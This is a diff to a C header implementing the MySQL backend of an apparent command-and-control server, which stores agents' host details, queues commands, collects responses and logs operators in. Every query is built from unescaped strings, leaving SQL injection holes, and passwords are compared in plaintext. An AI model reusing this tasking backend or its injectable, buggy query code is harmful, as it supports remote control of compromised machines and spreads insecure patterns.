@@ -1,6 +1,7 @@
 #ifndef database
 #define database
 
+
 #include <mysql/mysql.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -11,10 +12,13 @@
 #define BUFFER_SIZE 4096
 #define MAX_INFO 999999999
 
+// change so that it uses config file
+/*
 char dbserver[256] = "localhost";
 char user[32] = "core";
 char pass[32] = "core";
 char db[32] = "c2_database";
+*/
 
 struct db_agents {
     char agent_id[65];
@@ -37,8 +41,10 @@ struct db_logs {
 };
 
 
+
+
 MYSQL *con;
-int db_conn() {
+int db_conn(const char *dbserver, const char *user, const char *pass, const char *db) {
     con = mysql_init(NULL);
     if (con == NULL) {
         fprintf(stderr, "%s\n", mysql_error(con));
@@ -56,6 +62,7 @@ void db_close() {
     mysql_close(con);
 }
 
+// agent and operator
 int check_agent_id(char *agent_id) {
     char query[1024];
     snprintf(query, sizeof(query), "SELECT * FROM Agents WHERE agent_id = '%s'", agent_id);
@@ -75,7 +82,7 @@ int check_agent_id(char *agent_id) {
     return (num_rows > 0); // 1 if agent exists, 0 if not
 }
 
-
+// agent
 char *get_task(int task_id) {
     char query[1024];
     snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d;", task_id);
@@ -94,14 +101,13 @@ char *get_task(int task_id) {
     if (row && row[0]) {
         cmd = strdup(row[0]);
     }
-
     mysql_free_result(result);
 
     return cmd;
 }
 
 
-
+// agent
 void store_task_response(char *response, int task_id) { 
     char *query = malloc(sizeof(response) + 1024 );
     snprintf(query, sizeof(response) + 1024, "UPDATE Tasks SET status = TRUE, response = '%s' WHERE task_id = %d;", response, task_id);
@@ -115,7 +121,7 @@ void store_task_response(char *response, int task_id) {
 
 
 
-
+// agent
 int check_tasks_queue(char *agent_id) {
     char query[1024];
     snprintf(query, sizeof(query), "SELECT task_id, status FROM Tasks WHERE agent_id = '%s';", agent_id);
@@ -145,10 +151,7 @@ int check_tasks_queue(char *agent_id) {
     return -1; 
 }
 
-
-
-
-
+// agent
 void AgentsTable(struct db_agents args) {
     char *query = malloc(256+sizeof(struct db_agents));
     snprintf(query,  256 + sizeof(struct db_agents), "INSERT INTO Agents (agent_id, os, ip, mac, hostname) VALUES ('%s', '%s', '%s', '%s', '%s');", args.agent_id, args.os, args.ip , args.mac, args.hostname);
@@ -157,7 +160,7 @@ void AgentsTable(struct db_agents args) {
     }
     free(query);
 }
-
+// agent
 void update_last_seen(char *agent_id) {
     char query[1024];
     snprintf(query, sizeof(query), "UPDATE Agents SET last_seen = CURRENT_TIMESTAMP() WHERE agent_id = '%s';", agent_id);
@@ -166,6 +169,7 @@ void update_last_seen(char *agent_id) {
     }
 }
 
+// operator
 void TasksTable(struct db_tasks args) {
     char *query = malloc(256 + sizeof(struct db_tasks));
     snprintf(query,256 + sizeof(struct db_tasks), "INSERT INTO Tasks (agent_id, command, response) VALUES ('%s', '%s', '%s');", args.agent_id, args.command, args.response);
@@ -237,7 +241,7 @@ char *info_view(char *table) {
     return json_output;
 }
 
-
+// operator
 int authenticate_operator(char *username, char*password) {
     char *query = malloc(2048);
     snprintf(query, 2048, "SELECT * FROM Operators WHERE username='%s' AND password='%s';", username, password);
@@ -263,7 +267,7 @@ int authenticate_operator(char *username, char*password) {
     return -1;  // not authenticated
 }
 
-
+// operator
 char *tasks_per_agent(char *agent_id) {
     char *query = malloc(1024);
     snprintf(query, 1024, "SELECT task_id, command, response, status FROM Tasks WHERE agent_id = '%s';", agent_id);
@@ -310,6 +314,7 @@ char *tasks_per_agent(char *agent_id) {
     return json_output;   
 }
 
+// operator
 void new_tasks(char *agent_id, char *command) {
     char *query = malloc(1024);
     snprintf(query, 1024, "INSERT INTO Tasks (agent_id, command) VALUES ('%s', '%s');", agent_id, command);
